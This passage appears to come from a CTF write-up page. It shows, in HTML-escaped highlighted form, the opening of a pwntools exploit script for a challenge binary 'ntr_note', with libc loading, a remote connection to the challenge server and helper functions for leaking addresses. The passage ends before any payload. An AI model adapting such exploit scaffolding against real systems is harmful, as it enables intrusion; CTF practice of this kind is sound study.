line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; galatea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.update( os = &lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,timeout = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binary = &lt;span class=&#34;string&#34;&gt;&amp;#x27;ntr_note&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ntr_note&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc =elf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.binary = binary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DEBUG = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; DEBUG:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ntr_note&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;#p = process([&amp;quot;qemu-aarch64&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;&amp;quot;,binary])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;#p = process([&amp;quot;qemu-aarch64&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;&amp;quot;,-g,&amp;quot;1234&amp;quot;,binary])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  host = &lt;span class=&#34;string&#34;&gt;&amp;quot;81.68.86.115&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  port =  &lt;span class=&#34;string&#34;&gt;&amp;quot;10000&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p = remote(host,port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;     	: u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x7f&amp;quot;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;     	: u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;\xf7&amp;quot;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a,b  	: p.sendlineafter(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a),&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(b))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a,b 	: p.sendafter(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a),&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(b))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; name,data : p.success(name + &lt;span class=&#34;string&#34;&gt;&amp;quot;: 0x%x